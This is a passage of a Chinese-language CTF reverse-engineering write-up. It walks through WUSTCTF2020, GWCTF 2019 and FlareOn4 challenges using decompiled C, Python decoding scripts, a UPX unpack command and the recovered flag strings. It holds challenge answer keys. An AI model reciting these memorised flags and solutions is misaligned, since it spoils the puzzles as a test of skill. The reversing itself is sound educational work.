aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p><strong>TAG:一般题目</strong></p><p>给出了两个附件，一个是txt文件，另一个是一般的ELF的64位文件，txt文件给出的应该是程序的输出，将程序拖入64位ida分析，找到关键代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2Ch]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">19</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">*</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般的差不多算是加密的东西，直接得(太签到了)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">816</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1536</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">6144</span><span class="token punctuation">,</span> <span class="token number">984</span><span class="token punctuation">,</span> <span class="token number">51200</span><span class="token punctuation">,</span> <span class="token number">570</span><span class="token punctuation">,</span> <span class="token number">92160</span><span class="token punctuation">,</span> <span class="token number">1200</span><span class="token punctuation">,</span> <span class="token number">565248</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">1474560</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">6291456</span><span class="token punctuation">,</span> <span class="token number">1782</span><span class="token punctuation">,</span> <span class="token number">65536000</span><span class="token punctuation">]</span><span class="token comment"># 上面首位加上0作为填充位</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ctf2020&#123;d9-dE6-20c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p><strong>TAG:UPX脱壳</strong></p><p>打开没有后缀名，misc做习惯了之后总是先把这种比较小得没有后缀名的文件先使用记事本打开看看有什么东西。注意到UPX，直接脱壳</p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\attachment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210610004111012.png" alt></p><p><img src="/2021/05/28/CTF/image-20210610005411954.png" alt></p><p>但是这个似乎不是64位的可执行文件，而是i386。。应该是32位，ida32打开之后看函数太多先查找字符串</p><p><img src="/2021/05/28/CTF/image-20210610010158519.png" alt></p><p>我踏马直接大雾，这是什么牛马，这为啥就直接就在这，这是签到吗，为啥还叫level2啊。。。想了许久，也许比赛本来是面向新生的，新生可能对upx的脱壳方法不太了解罢。</p><pre class="line-numbers language-none"><code class="language-none">wctf2020&#123;Just_upx_-d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><p><strong>TAG:</strong></p><p><img src="/2021/05/28/CTF/image-20210610010527059.png" alt></p><p>关键<code>mian</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h]</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>  __int64 v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h] BYREF</span>  v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let us play a game?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you have six chances to input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    dword_601078 <span class="token operator">=</span> v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    dword_60107C <span class="token operator">=</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_601060<span class="token punctuation">;</span>    <span class="token function">sub_400686</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dword_601078<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_601060<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_601078<span class="token punctuation">;</span>    <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_60107C<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400770</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> a2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NO NO NO~ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You seccess half\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do not forget to change input to hex and combine~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ByeBye"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明天再说</p><h2 id="注册程序的破解-CTF向"><a href="#注册程序的破解-CTF向" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h2 id="其他文件逆向"><a href="#其他文件逆向" class="headerlink" title="其他文件逆向"></a>其他文件逆向</h2><h3 id="pyc文件逆向"><a href="#pyc文件逆向" class="headerlink" title="pyc文件逆向"></a>pyc文件逆向</h3><h4 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h4><p><strong>考的知识点</strong></p><p>主要是<code>异或</code>、<code>取模</code>的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是<code>a^a^b=b</code></p><p><strong>解题过程</strong></p><p>懒得再下函数库了，直接<a href="https://tool.lu/pyc/">在线网站</a>搞算了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token keyword">print</span> <span class="token string">'Welcome to Re World!'</span><span class="token keyword">print</span> <span class="token string">'Your input1 is your flag~'</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> codecode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span><span class="token string">'\x12'</span><span class="token punctuation">,</span><span class="token string">'\x1d'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'\x06'</span><span class="token punctuation">,</span><span class="token string">'\x14'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'\x1b'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'\x01'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'\x13'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit http://tool.lu/pyc/ for more information</span><span class="token triple-quoted-string string">"""print('Welcome to Re World!')print('Your input1 is your flag~')input1 = 'flag'code = ''l = len(input1)for i in range(l):    num = ((ord(input1[i]) + i) % 128 + 128) % 128    code += chr(num)for i in range(l - 1):    code[i] = code[i] ^ code[i + 1]"""</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span>        <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="js文件逆向"><a href="#js文件逆向" class="headerlink" title="js文件逆向"></a>js文件逆向</h3><p>这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。</p><h4 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h4><p>给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"prompt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz"</span> <span class="token operator">==</span> rotFlag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Incorrect flag, rot again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> rotFlag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[a-zA-Z]/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>c <span class="token operator">&lt;=</span> <span class="token string">"Z"</span> <span class="token operator">?</span> <span class="token number">90</span> <span class="token operator">:</span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> c <span class="token operator">:</span> c <span class="token operator">-</span> <span class="token number">26</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那个<code>replace</code>函数负责遍历所有大小写字母，后面的<code>function</code>主要负责进行转换，将每个大小写字母带入其中即可，其中<code>90-&gt;&#39;Z&#39;</code>、<code>122-&gt;&#39;z&#39;</code>。后面的就很简单了，</p><ol><li>如果该字符是大写字母就将<code>Z</code>的ASCII码值与<code>c本身的ASCII码值+13</code>进行比较</li><li>如果<code>Z</code>比较大，就返回c本身的字符串，</li><li>反之则返回c的ASCII码值<code>-26</code>的数值所代表的ASCII字符。</li><li>小写字母是亦同理。</li></ol><p>这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的</p><p><img src="/2021/05/28/CTF/image-20210531174558489.png" alt="image-20210531174558489"></p><p>rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）</p><p><img src="/2021/05/28/CTF/image-20210531174817470.png" alt="image-20210531174817470"></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="方向介绍"><a href="#方向介绍" class="headerlink" title="方向介绍"></a>方向介绍</h2><p>这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。</p><h2 id="一般Android逆向"><a href="#一般Android逆向" class="headerlink" title="一般Android逆向"></a>一般Android逆向</h2><h3 id="buu、findit"><a href="#buu、findit" class="headerlink" 